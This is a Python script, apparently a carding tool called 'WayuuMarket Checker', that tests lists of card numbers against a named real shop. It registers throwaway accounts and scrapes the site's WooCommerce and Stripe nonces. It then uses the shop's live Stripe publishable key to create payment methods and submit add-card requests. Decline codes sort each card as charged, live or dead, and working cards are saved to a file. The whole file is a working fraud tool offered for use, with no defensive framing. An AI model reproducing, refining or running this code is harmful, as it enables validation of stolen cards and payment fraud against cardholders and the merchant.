"""
WayuuMarket Checker v5.4
Better nonce detection for setup intent
"""
import requests
import random
import string
import uuid
import time
import os
import re
import json

INPUT_FILE = "cards.txt"
LIVE_FILE = "live.txt"
DEAD_FILE = "dead.txt"
DELAY = 5

def randmail():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)) + '@gmail.com'

def get_bin(cc):
    try:
        r = requests.get(f'https://lookup.binlist.net/{cc[:6]}', timeout=5)
        if r.status_code == 200:
            d = r.json()
            return f"{d.get('scheme','').upper()} | {d.get('bank',{}).get('name','')} | {d.get('country',{}).get('name','')}"
    except:
        pass
    return cc[:6]

def find_setup_intent_nonce(html):
    """Try multiple patterns to find the setup intent nonce"""
    
    # Pattern 1: wc_stripe_params.createSetupIntentNonce
    m = re.search(r'createSetupIntentNonce["\'\s:]+["\']([a-f0-9]{10})["\']', html)
    if m:
        print(f"[DEBUG] Found nonce pattern 1: {m.group(1)}")
        return m.group(1)
    
    # Pattern 2: In wc_stripe_params JSON
    m = re.search(r'var\s+wc_stripe_params\s*=\s*(\{[^;]+\})\s*;', html, re.DOTALL)
    if m:
        try:
            # Try to extract nonce from JSON-like structure
            params = m.group(1)
            nonce_match = re.search(r'"createSetupIntentNonce"\s*:\s*"([^"]+)"', params)
            if nonce_match:
                print(f"[DEBUG] Found nonce in wc_stripe_params: {nonce_match.group(1)}")
                return nonce_match.group(1)
        except:
            pass
    
    # Pattern 3: Any nonce near "setup" or "intent"
    m = re.search(r'setup[^}]*nonce["\'\s:]+["\']([a-f0-9]{10})["\']', html, re.IGNORECASE)
    if m:
        print(f"[DEBUG] Found nonce pattern 3: {m.group(1)}")
        return m.group(1)
    
    # Pattern 4: In inline script with stripe
    scripts = re.findall(r'<script[^>]*>([^<]+)</script>', html, re.DOTALL)
    for script in scripts:
        if 'stripe' in script.lower():
            m = re.search(r'nonce["\'\s:]+["\']([a-f0-9]{10})["\']', script)
            if m:
                print(f"[DEBUG] Found nonce in stripe script: {m.group(1)}")
                return m.group(1)
    
    # Pattern 5: wc_stripe_upe_params
    m = re.search(r'wc_stripe_upe_params\s*=\s*(\{[^;]+\})', html, re.DOTALL)
    if m:
        params = m.group(1)
        nonce_match = re.search(r'"createSetupIntentNonce"\s*:\s*"([^"]+)"', params)
        if nonce_match:
            print(f"[DEBUG] Found nonce in wc_stripe_upe_params: {nonce_match.group(1)}")
            return nonce_match.group(1)
    
    # Pattern 6: Look for all 10-char hex strings near 'nonce'
    all_nonces = re.findall(r'["\']([a-f0-9]{10})["\']', html)
    nonce_contexts = re.findall(r'.{0,30}nonce.{0,50}', html, re.IGNORECASE)
    
    print(f"[DEBUG] Found {len(all_nonces)} potential nonces")
    print(f"[DEBUG] Nonce contexts: {nonce_contexts[:3]}")
    
    # Try the first nonce found near 'stripe' context
    m = re.search(r'stripe[^}]{0,200}["\']([a-f0-9]{10})["\']', html, re.IGNORECASE)
    if m:
        print(f"[DEBUG] Found nonce near stripe: {m.group(1)}")
        return m.group(1)
    
    return None

def check_card(cc, mes, ano, cvv):
    if len(str(ano)) == 4:
        ano = str(ano)[-2:]
    mes = str(mes).zfill(2)
    
    try:
        s = requests.Session()
        s.headers.update({
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        })
        
        # Register
        print("[*] Registering...")
        r = s.get('https://wayuumarket.com/my-account/', timeout=60)
        m = re.search(r'name="woocommerce-register-nonce"\s*value="([^"]+)"', r.text)
        if not m:
            return 'ERROR', 'No register nonce', ''
        
        email = randmail()
        s.post('https://wayuumarket.com/my-account/', data={
            'email': email,
            'woocommerce-register-nonce': m.group(1),
            'register': 'Register',
        }, timeout=60)
        
        # Get payment page
        print("[*] Getting payment page...")
        r = s.get('https://wayuumarket.com/my-account/add-payment-method/', timeout=60)
        html = r.text
        
        # Find form nonces
        fnonce = re.search(r'add-payment-method-nonce.*?value="([^"]+)"', html)
        wpnonce = re.search(r'name="_wpnonce"\s*value="([^"]+)"', html)
        
        # Find setup intent nonce
        setup_nonce = find_setup_intent_nonce(html)
        print(f"[DEBUG] Setup Intent Nonce: {setup_nonce}")
        
        # Create PM
        print("[*] Creating PM...")
        guid = str(uuid.uuid4())
        
        pm_resp = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            headers={'content-type': 'application/x-www-form-urlencoded'},
            data={
                'type': 'card',
                'card[number]': cc,
                'card[cvc]': cvv,
                'card[exp_month]': mes,
                'card[exp_year]': ano,
                'guid': guid,
                'muid': guid,
                'sid': guid,
                'key': 'pk_live_51KDcNrImW2Hlp9sc4dxVEesSbWiCa3eqc1g7JIVFf0oa2tePZ7KAkaPSe3tgV0NrHnAgHDGZxZtGqDXRCbFqz0n000pyW5QR3A',
            },
            timeout=60
        ).json()
        
        if 'error' in pm_resp:
            c = pm_resp['error'].get('decline_code') or pm_resp['error'].get('code', '')
            msg = pm_resp['error'].get('message', '')
            print(f"[DEBUG] PM Error: {c} - {msg}")
            
            if c in ['incorrect_cvc', 'insufficient_funds', 'generic_decline', 'expired_card', 
                     'lost_card', 'stolen_card', 'do_not_honor', 'card_velocity_exceeded']:
                return 'CCN', c, msg
            return 'DEAD', c or msg[:40], msg
        
        pm_id = pm_resp.get('id', '')
        if not pm_id:
            return 'ERROR', 'No PM', ''
        
        print(f"[*] PM: {pm_id}")
        
        # Try setup intent AJAX if we have nonce
        if setup_nonce:
            print("[*] Trying setup intent AJAX...")
            
            si_resp = s.post(
                'https://wayuumarket.com/?wc-ajax=wc_stripe_create_setup_intent',
                headers={
                    'accept': 'application/json, text/javascript, */*; q=0.01',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'x-requested-with': 'XMLHttpRequest',
                },
                data={
                    'stripe_source_id': pm_id,
                    'nonce': setup_nonce,
                },
                timeout=60
            )
            
            print(f"[DEBUG] Setup Intent Response: {si_resp.text[:200]}")
            
            try:
                j = si_resp.json()
                
                if j.get('success') == True:
                    return 'CHARGED', 'Card Added via Setup Intent!', str(j)
                
                if j.get('status') == 'succeeded':
                    return 'CHARGED', 'Setup Intent Succeeded!', str(j)
                
                err = j.get('error', {})
                if isinstance(err, dict):
                    err_msg = err.get('message', '')
                else:
                    err_msg = str(err)
                
                if 'verify your request' not in err_msg.lower():
                    # Real error from Stripe
                    err_lower = err_msg.lower()
                    if any(x in err_lower for x in ['decline', 'insufficient', 'cvc', 'expired', 'lost', 'stolen']):
                        return 'CCN', err_msg[:40], err_msg
                    if 'authentication' in err_lower or '3d' in err_lower:
                        return 'CCN', '3DS Required', err_msg
                    return 'DEAD', err_msg[:40], err_msg
                else:
                    print("[DEBUG] Nonce verification failed, trying form submission...")
            except:
                pass
        
        # Fallback: Submit form
        print("[*] Submitting form...")
        r = s.post(
            'https://wayuumarket.com/my-account/add-payment-method/',
            data={
                'payment_method': 'stripe',
                'wc-stripe-payment-token': 'new',
                'wc_stripe_payment_method': pm_id,
                'stripe_source': pm_id,
                'woocommerce-add-payment-method-nonce': fnonce.group(1) if fnonce else '',
                '_wpnonce': wpnonce.group(1) if wpnonce else '',
            },
            timeout=60,
            allow_redirects=True
        )
        
        print(f"[DEBUG] Form URL: {r.url}")
        
        txt = r.text
        
        # Check for success
        success_msg = re.search(r'class="woocommerce-message[^"]*"[^>]*>([^<]+)', txt)
        error_msg = re.search(r'class="woocommerce-error[^"]*"[^>]*>.*?<li>([^<]+)', txt, re.DOTALL)
        
        if success_msg:
            print(f"[DEBUG] Success: {success_msg.group(1)}")
        if error_msg:
            print(f"[DEBUG] Error: {error_msg.group(1)}")
        
        is_redirected = '/payment-methods' in r.url and '/add-payment-method' not in r.url
        has_success = success_msg and 'added' in success_msg.group(1).lower()
        
        if is_redirected or has_success:
            return 'CHARGED', success_msg.group(1).strip() if success_msg else 'Redirected', ''
        
        if error_msg:
            err = error_msg.group(1).strip()
            err_lower = err.lower()
            if any(x in err_lower for x in ['decline', 'insufficient', 'cvc', 'expired', 'lost', 'stolen', 'honor']):
                return 'CCN', err[:50], err
            if 'authentication' in err_lower or '3d' in err_lower:
                return 'CCN', '3DS Required', err
            return 'DEAD', err[:50], err
        
        # PM created but no clear result
        brand = pm_resp.get('card', {}).get('brand', '').upper()
        return 'LIVE', f'PM OK ({brand})', 'No clear success/error'
        
    except requests.exceptions.ConnectionError:
        return 'ERROR', 'Connection Reset', ''
    except requests.exceptions.Timeout:
        return 'ERROR', 'Timeout', ''
    except Exception as e:
        return 'ERROR', str(e)[:30], ''

def main():
    print("""
    ╔═══════════════════════════════════════╗
    ║    WAYUUMARKET CHECKER v5.4           ║
    ║    Better Nonce Detection             ║
    ╚═══════════════════════════════════════╝
    """)
    
    if not os.path.exists(INPUT_FILE):
        with open(INPUT_FILE, 'w') as f:
            f.write("# cc|mm|yy|cvv\n")
        print(f"Created {INPUT_FILE}")
        return
    
    with open(INPUT_FILE, 'r') as f:
        cards = [l.strip() for l in f if '|' in l and not l.startswith('#')]
    
    if not cards:
        print("No cards!")
        return
    
    print(f"Cards: {len(cards)}")
    print("=" * 50)
    
    stats = {'charged': 0, 'ccn': 0, 'live': 0, 'dead': 0, 'error': 0}
    
    for i, card in enumerate(cards, 1):
        p = card.split('|')
        if len(p) < 4:
            continue
        
        cc, mes, ano, cvv = p[0], p[1], p[2], p[3]
        full = f"{cc}|{mes}|{ano}|{cvv}"
        
        print(f"\n{'='*50}")
        print(f"[{i}/{len(cards)}] {cc[:6]}xxxxxx{cc[-4:]}")
        
        start = time.time()
        status, msg, raw = check_card(cc, mes, ano, cvv)
        t = round(time.time() - start, 2)
        
        if status == 'CHARGED':
            print(f"\n[CHARGED] {full}")
            print(f"[+] {msg}")
            print(f"[+] {get_bin(cc)}")
            stats['charged'] += 1
            open(LIVE_FILE, 'a').write(f"{full}|CHARGED|{msg}\n")
        elif status == 'CCN':
            print(f"\n[CCN] {full}")
            print(f"[+] {msg}")
            print(f"[+] {get_bin(cc)}")
            stats['ccn'] += 1
            open(LIVE_FILE, 'a').write(f"{full}|CCN|{msg}\n")
        elif status == 'LIVE':
            print(f"\n[LIVE] {full}")
            print(f"[+] {msg}")
            print(f"[+] {get_bin(cc)}")
            stats['live'] += 1
            open(LIVE_FILE, 'a').write(f"{full}|LIVE|{msg}\n")
        elif status == 'ERROR':
            print(f"\n[ERROR] {msg}")
            stats['error'] += 1
        else:
            print(f"\n[DEAD] {full}")
            print(f"[-] {msg}")
            stats['dead'] += 1
            open(DEAD_FILE, 'a').write(f"{full}|{msg}\n")
        
        print(f"[{t}s]")
        
        if i < len(cards):
            time.sleep(DELAY)
    
    print("\n" + "=" * 50)
    print(f"CHARGED:{stats['charged']} CCN:{stats['ccn']} LIVE:{stats['live']} DEAD:{stats['dead']} ERR:{stats['error']}")

if __name__ == "__main__":
    main()
